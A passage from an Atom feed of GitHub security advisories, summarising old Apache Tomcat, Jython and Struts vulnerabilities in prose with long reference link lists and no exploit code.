<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2">http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0343.html">http://rhn.redhat.com/errata/RHSA-2014-0343.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0344.html">http://rhn.redhat.com/errata/RHSA-2014-0344.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0345.html">http://rhn.redhat.com/errata/RHSA-2014-0345.html</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/57675">http://secunia.com/advisories/57675</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59733">http://secunia.com/advisories/59733</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521829">http://svn.apache.org/viewvc?view=revision&amp;revision=1521829</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521854">http://svn.apache.org/viewvc?view=revision&amp;revision=1521854</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1552565">http://svn.apache.org/viewvc?view=revision&amp;revision=1552565</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html">http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html">http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65773">http://www.securityfocus.com/bid/65773</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j448-j653-r3vj">https://github.com/advisories/GHSA-j448-j653-r3vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j448-j653-r3vj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat is vulnerable to HTTP request-smuggling]]></title>
        <id>https://github.com/advisories/GHSA-j448-j653-r3vj</id>
        <link href="https://github.com/advisories/GHSA-j448-j653-r3vj"/>
        <updated>2023-08-17T23:32:18.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.47, and 8.x before 8.0.0-RC3, when an HTTP connector or AJP connector is used, does not properly handle certain inconsistent HTTP request headers, which allows remote attackers to trigger incorrect identification of a request's length and conduct request-smuggling attacks via (1) multiple Content-Length headers or (2) a Content-Length header and a "Transfer-Encoding: chunked" header.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2005-2090.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4286">https://nvd.nist.gov/vuln/detail/CVE-2013-4286</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069921">https://bugzilla.redhat.com/show_bug.cgi?id=1069921</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2">http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0343.html">http://rhn.redhat.com/errata/RHSA-2014-0343.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0344.html">http://rhn.redhat.com/errata/RHSA-2014-0344.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0345.html">http://rhn.redhat.com/errata/RHSA-2014-0345.html</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/57675">http://secunia.com/advisories/57675</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59733">http://secunia.com/advisories/59733</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521829">http://svn.apache.org/viewvc?view=revision&amp;revision=1521829</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521854">http://svn.apache.org/viewvc?view=revision&amp;revision=1521854</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1552565">http://svn.apache.org/viewvc?view=revision&amp;revision=1552565</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html">http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html">http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65773">http://www.securityfocus.com/bid/65773</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j448-j653-r3vj">https://github.com/advisories/GHSA-j448-j653-r3vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j448-j653-r3vj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat is vulnerable to HTTP request-smuggling]]></title>
        <id>https://github.com/advisories/GHSA-j448-j653-r3vj</id>
        <link href="https://github.com/advisories/GHSA-j448-j653-r3vj"/>
        <updated>2023-08-17T23:32:18.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.47, and 8.x before 8.0.0-RC3, when an HTTP connector or AJP connector is used, does not properly handle certain inconsistent HTTP request headers, which allows remote attackers to trigger incorrect identification of a request's length and conduct request-smuggling attacks via (1) multiple Content-Length headers or (2) a Content-Length header and a "Transfer-Encoding: chunked" header.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2005-2090.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4286">https://nvd.nist.gov/vuln/detail/CVE-2013-4286</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069921">https://bugzilla.redhat.com/show_bug.cgi?id=1069921</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2">http://marc.info/?l=bugtraq&amp;m=141390017113542&amp;w=2</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0343.html">http://rhn.redhat.com/errata/RHSA-2014-0343.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0344.html">http://rhn.redhat.com/errata/RHSA-2014-0344.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2014-0345.html">http://rhn.redhat.com/errata/RHSA-2014-0345.html</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/57675">http://secunia.com/advisories/57675</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59733">http://secunia.com/advisories/59733</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521829">http://svn.apache.org/viewvc?view=revision&amp;revision=1521829</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521854">http://svn.apache.org/viewvc?view=revision&amp;revision=1521854</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1552565">http://svn.apache.org/viewvc?view=revision&amp;revision=1552565</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html">http://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html">http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65773">http://www.securityfocus.com/bid/65773</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j448-j653-r3vj">https://github.com/advisories/GHSA-j448-j653-r3vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j448-j653-r3vj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.python:jython-standalone] Jython Improper Access Restrictions vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9347-9w64-q5wp</id>
        <link href="https://github.com/advisories/GHSA-9347-9w64-q5wp"/>
        <updated>2023-08-17T22:33:36.000Z</updated>
        <content type="html"><![CDATA[<p>Jython before 2.7.2b3 uses the current umask to set the privileges of the class cache files, which allows local users to bypass intended access restrictions via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-2027">https://nvd.nist.gov/vuln/detail/CVE-2013-2027</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=947949">https://bugzilla.redhat.com/show_bug.cgi?id=947949</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2015-0096.html">http://advisories.mageia.org/MGASA-2015-0096.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2015-02/msg00055.html">http://lists.opensuse.org/opensuse-updates/2015-02/msg00055.html</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:158">http://www.mandriva.com/security/advisories?name=MDVSA-2015:158</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html">http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html</a></li>
<li><a href="https://github.com/jython/frozen-mirror/commit/053949e66d307168fd70b39725f4d3e6b642acc1">https://github.com/jython/frozen-mirror/commit/053949e66d307168fd70b39725f4d3e6b642acc1</a></li>
<li><a href="https://github.com/jython/frozen-mirror/blob/b8d7aa4cee50c0c0fe2f4b235dd62922dd0f3f99/NEWS#L25C8-L25C15">https://github.com/jython/frozen-mirror/blob/b8d7aa4cee50c0c0fe2f4b235dd62922dd0f3f99/NEWS#L25C8-L25C15</a></li>
<li><a href="https://github.com/advisories/GHSA-9347-9w64-q5wp">https://github.com/advisories/GHSA-9347-9w64-q5wp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9347-9w64-q5wp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T02:05:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat Unrestricted file upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h6c8-x5r3-pm88</id>
        <link href="https://github.com/advisories/GHSA-h6c8-x5r3-pm88"/>
        <updated>2023-08-17T22:16:39.000Z</updated>
        <content type="html"><![CDATA[<p>Unrestricted file upload vulnerability in Apache Tomcat 7.x before 7.0.40, in certain situations involving outdated java.io.File code and a custom JMX configuration, allows remote attackers to execute arbitrary code by uploading and accessing a JSP file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4444">https://nvd.nist.gov/vuln/detail/CVE-2013-4444</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="http://archives.neohapsis.com/archives/bugtraq/2014-09/0075.html">http://archives.neohapsis.com/archives/bugtraq/2014-09/0075.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://openwall.com/lists/oss-security/2014/10/24/12">http://openwall.com/lists/oss-security/2014/10/24/12</a></li>
<li><a href="http://seclists.org/fulldisclosure/2021/Jan/23">http://seclists.org/fulldisclosure/2021/Jan/23</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3447">http://www.debian.org/security/2016/dsa-3447</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.securityfocus.com/bid/69728">http://www.securityfocus.com/bid/69728</a></li>
<li><a href="http://www.securitytracker.com/id/1030834">http://www.securitytracker.com/id/1030834</a></li>
<li><a href="https://github.com/advisories/GHSA-h6c8-x5r3-pm88">https://github.com/advisories/GHSA-h6c8-x5r3-pm88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6c8-x5r3-pm88</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:12:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.struts.xwork:xwork-core] XWork in Apache Struts Reveals Sensitive Information]]></title>
        <id>https://github.com/advisories/GHSA-9ccm-g362-2r35</id>
        <link href="https://github.com/advisories/GHSA-9ccm-g362-2r35"/>
        <updated>2023-08-17T21:58:11.000Z</updated>
        <content type="html"><![CDATA[<p>XWork 2.2.1 in Apache Struts 2.2.1, and OpenSymphony XWork in OpenSymphony WebWork, allows remote attackers to obtain potentially sensitive information about internal Java class paths via vectors involving an s:submit element and a nonexistent method, a different vulnerability than CVE-2011-1772.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2088">https://nvd.nist.gov/vuln/detail/CVE-2011-2088</a></li>
<li><a href="https://issues.apache.org/jira/browse/WW-3579">https://issues.apache.org/jira/browse/WW-3579</a></li>
<li><a href="http://secureappdev.blogspot.com/2011/05/apache-struts-2-xwork-webwork-reflected.html">http://secureappdev.blogspot.com/2011/05/apache-struts-2-xwork-webwork-reflected.html</a></li>
<li><a href="https://github.com/apache/struts/commit/885ab3459e146ff830d1f7257f809f4a3dd4493a">https://github.com/apache/struts/commit/885ab3459e146ff830d1f7257f809f4a3dd4493a</a></li>
<li><a href="https://web.archive.org/web/20110726113612/http://www.ventuneac.net/security-advisories/MVSA-11-006">https://web.archive.org/web/20110726113612/http://www.ventuneac.net/security-advisories/MVSA-11-006</a></li>
<li><a href="https://web.archive.org/web/20201207174744/http://www.securityfocus.com/archive/1/518066/100/0/threaded">https://web.archive.org/web/20201207174744/http://www.securityfocus.com/archive/1/518066/100/0/threaded</a></li>
<li><a href="https://github.com/advisories/GHSA-9ccm-g362-2r35">https://github.com/advisories/GHSA-9ccm-g362-2r35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9ccm-g362-2r35</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T02:55:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat Allows Replacing of XML Parser]]></title>
        <id>https://github.com/advisories/GHSA-r7c8-hghc-2mp8</id>
        <link href="https://github.com/advisories/GHSA-r7c8-hghc-2mp8"/>
        <updated>2023-08-17T21:45:11.000Z</updated>
